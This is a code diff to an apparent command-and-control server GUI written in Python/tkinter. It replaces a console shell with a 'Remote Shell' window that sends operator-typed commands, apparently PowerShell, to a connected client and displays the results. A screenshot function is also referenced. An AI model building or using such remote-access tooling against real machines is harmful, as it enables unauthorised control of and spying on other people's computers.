@@ -807,26 +807,68 @@ class C2ServerGUI:
         self._disable_commands()
         
     def start_powershell(self):
-        try:
-            def run_shell():
-                try:
-                    print("Type 'quit' to exit shell")
-                    self.c2.interactive_shell()
-                    self.root.after(0, lambda: self.log("Shell session ended", "info"))
-                    
-                except Exception as e:
-                    error_msg = f"Shell error: {e}"
-                    print(f"\n{error_msg}\n")
-                    self.root.after(0, lambda: self.log(error_msg, "error"))
-            
-            shell_thread = threading.Thread(target=run_shell, daemon=True)
-            shell_thread.start()
-            
-            self.log("Shell started in terminal (check your console)", "success")
+        # Open an internal non-blocking shell window that sends commands via psh_command
+        if not self.connected or not self.c2:
+            messagebox.showerror("Error", "Not connected to any client")
+            return
 
-        except Exception as e:
-            self.log(f"Shell error: {e}", "error")
-            messagebox.showerror("Error", f"Failed to start shell:\n{e}")
+        shell_win = tk.Toplevel(self.root)
+        shell_win.title("Remote Shell")
+        shell_win.geometry("900x600")
+        shell_win.transient(self.root)
+
+        # Output display
+        out_frame = ttk.Frame(shell_win, padding=8)
+        out_frame.pack(fill=tk.BOTH, expand=True)
+
+        out_text = scrolledtext.ScrolledText(
+            out_frame, height=25, state=tk.DISABLED, wrap=tk.WORD, font=("Consolas", 10)
+        )
+        out_text.pack(fill=tk.BOTH, expand=True)
+
+        # Input frame
+        input_frame = ttk.Frame(shell_win, padding=8)
+        input_frame.pack(fill=tk.X)
+
+        cmd_entry = ttk.Entry(input_frame, font=("Consolas", 10))
+        cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 8))
+
+        def append_output(text, tag=None):
+            out_text.config(state=tk.NORMAL)
+            out_text.insert(tk.END, text + "\n")
+            if tag:
+                out_text.tag_add(tag, f"end-{len(text)+1}c", tk.END)
+            out_text.see(tk.END)
+            out_text.config(state=tk.DISABLED)
+
+        def send_cmd(_=None):
+            cmd = cmd_entry.get().strip()
+            if not cmd:
+                return
+
+            # Show the command in output
+            append_output(f"> {cmd}", "info")
+            cmd_entry.delete(0, tk.END)
+
+            def do_send():
+                try:
+                    output = self.c2.psh_command(cmd)
+                    if output is None:
+                        output = ""
+                    # Ensure output is string
+                    output = str(output)
+                    self.root.after(0, lambda: append_output(output))
+                except Exception as e:
+                    self.root.after(0, lambda: append_output(f"Shell error: {e}", "error"))
+
+            threading.Thread(target=do_send, daemon=True).start()
+
+        cmd_entry.bind('<Return>', send_cmd)
+
+        ttk.Button(input_frame, text="Send", command=send_cmd, width=12).pack(side=tk.LEFT)
+        ttk.Button(input_frame, text="Close", command=shell_win.destroy, width=12).pack(side=tk.LEFT, padx=(8,0))
+
+        self.log("Remote shell opened", "success")
             
     def take_screenshot(self):
         try:
